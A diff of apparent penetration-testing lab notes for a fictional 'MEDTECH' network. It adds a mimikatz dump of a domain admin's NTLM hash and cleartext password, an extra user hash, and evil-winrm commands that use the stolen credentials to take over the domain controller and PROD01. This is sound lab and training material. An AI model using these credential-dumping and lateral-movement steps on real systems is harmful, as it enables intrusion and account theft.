@@ -16,10 +16,10 @@ Recently formed IoT healthcare startup.
 ## Internal
 | IP          | Name     | Services-nxc    | Flags                |
 | ----------- | -------- | --------------- | -------------------- |
-| 172.16.x.10 | DC       | smb, winrm      | proof                |
+| 172.16.x.10 | DC       | smb, winrm      | ~~proof~~            |
 | 172.16.x.11 | FILES02  | smb, winrm      | ~~local~~, ~~proof~~ |
 | 172.16.x.12 | DEV04    | smb, rdp, winrm | ~~local~~, ~~proof~~ |
-| 172.16.x.13 | PROD01   | smb, winrm      | proof                |
+| 172.16.x.13 | PROD01   | smb, winrm      | ~~proof~~            |
 | 172.16.x.14 | .        | ssh             | local                |
 | 172.16.x.82 | CLIENT01 | smb, rdp        | ~~proof~~            |
 | 172.16.x.83 | CLIENT02 | smb, winrm      | ~~local~~, ~~proof~~ |
@@ -44,7 +44,7 @@ net accounts
 		- FILES 02 - Flowers1    (admin)
 	- NTLM - 464f388c3fe52a0fa0a6c8926d62059c
 - leon - domain admin
-	- rabbit!:)
+	- rabbit:)
 - mario
 - wario
 	- DC01 - Mushroom!
@@ -54,6 +54,7 @@ net accounts
 - peach
 - yoshi
 	- NTLM - cd21be418f01f5591ac8df1fdeaa54b6
+	- NTLM - fdf36048c1cf88f5630381c5e38feb8e
 	- DEV04 - Mushroom!    (admin)
 	- CLIENT01 - Mushroom!    (admin)
 - offsec
@@ -314,6 +315,20 @@ xfreerdp /cert-ignore /v:172.16.x.12 /u:yoshi /p:Mushroom!
 ```powershell
 ╔══════════╣ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
      File Permissions "C:\TEMP\backup.exe": yoshi [WriteData/CreateFiles]
+
+mimikatz # privilege::debug
+	Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+	...
+         * Username : leon
+         * Domain   : MEDTECH
+         * NTLM     : 2e208ad146efda5bc44869025e06544a
+		...
+        kerberos :
+         * Username : leon
+         * Domain   : MEDTECH.COM
+         * Password : rabbit:)
 ```
 #### PrivEsc
 - In Kali
@@ -416,3 +431,24 @@ whoami
 
 type C:\users\administrator\desktop\proof.txt
 ```
+
+## 172.16.x.13
+#### Foothold
+```bash
+evil-winrm -i 172.16.179.13 -u leon -p "rabbit:)"
+```
+#### proof.txt
+```powershell
+type C:\users\administrator\desktop\proof.txt
+```
+
+## 172.16.x.10
+#### Foothold
+```bash
+evil-winrm -i 172.16.179.10 -u leon -p "rabbit:)"
+```
+#### proof.txt
+```powershell
+type C:\users\administrator\desktop\proof.txt
+```
+
